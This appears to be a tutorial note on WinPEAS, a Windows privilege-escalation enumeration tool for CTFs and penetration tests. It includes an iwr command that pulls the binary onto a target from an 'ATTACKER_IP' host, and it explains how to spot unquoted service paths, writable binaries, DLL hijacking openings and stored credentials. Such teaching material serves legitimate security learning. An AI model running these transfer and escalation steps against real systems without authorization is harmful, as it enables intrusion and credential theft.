**WinPEAS** is a post-exploitation enumeration tool designed to identify privilege escalation vectors on Windows systems. It automates the discovery of misconfigurations such as weak permissions, vulnerable services, credential leaks, and insecure registry settings.

It is widely used in CTFs and real-world engagements because it consolidates many manual checks into a single execution.

---

## Installation

Download the latest binary from the official repository:

```bash
curl -LO https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
```

Transfer the binary to the target machine using your preferred method:

```bash
python3 -m http.server 8080
```

```powershell
iwr -uri http://ATTACKER_IP:8080/winPEASx64.exe -OutFile winPEASx64.exe
```

---

## Basic Usage

Execute the binary directly from the target system:

```powershell
.\winPEASx64.exe
```

The tool will start enumerating the system and print color-coded results highlighting potential vulnerabilities.

---

## Saving Output for Analysis

For large outputs, it is better to save results to a file:

```powershell
.\winPEASx64.exe > winpeas_output.txt
```

You can then review it locally or transfer it back:

```powershell
type winpeas_output.txt
```

---

## Practical Usage During Enumeration

WinPEAS output can be overwhelming, so focus on high-value sections:

### Services and Permissions

Look for:

- Unquoted service paths
    
- Writable service binaries
    
- Weak service permissions
    

Example indicator:

```text
[+] Unquoted Service Path found!
```

---

### File and Directory Permissions

Identify writable paths in sensitive locations:

```text
[+] Writable directory: C:\Program Files\App\
```

This can lead to:

- DLL Hijacking
    
- Binary replacement
    

---

### Credential Exposure

WinPEAS checks for credentials in:

- Registry
    
- Configuration files
    
- Environment variables
    

Example:

```text
[+] Found password in registry
```

---

### Scheduled Tasks

Look for tasks executed with high privileges:

```text
[+] Scheduled task running as SYSTEM
```

If the script or binary is writable → privilege escalation.
